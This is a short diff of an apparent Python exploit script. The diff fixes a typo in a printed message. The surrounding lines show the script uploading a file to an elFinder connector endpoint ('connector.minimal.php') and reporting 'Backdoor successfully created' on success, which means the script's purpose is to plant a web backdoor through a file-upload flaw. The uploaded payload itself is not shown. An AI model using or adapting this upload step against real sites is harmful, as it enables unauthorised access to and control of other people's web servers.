@@ -54,7 +54,7 @@ def main(URL,php_path):
 	resp = requests.post(URL + "/vendor_extra/elfinder/php/connector.minimal.php",files=multipart_form_data,headers=hdrs)
 
 	if resp.status_code == 200:
-		print("Backdoor succssfully created")
+		print("Backdoor successfully created")
 	else:
 		print("Error on uploading file, exiting...")
 		return 1
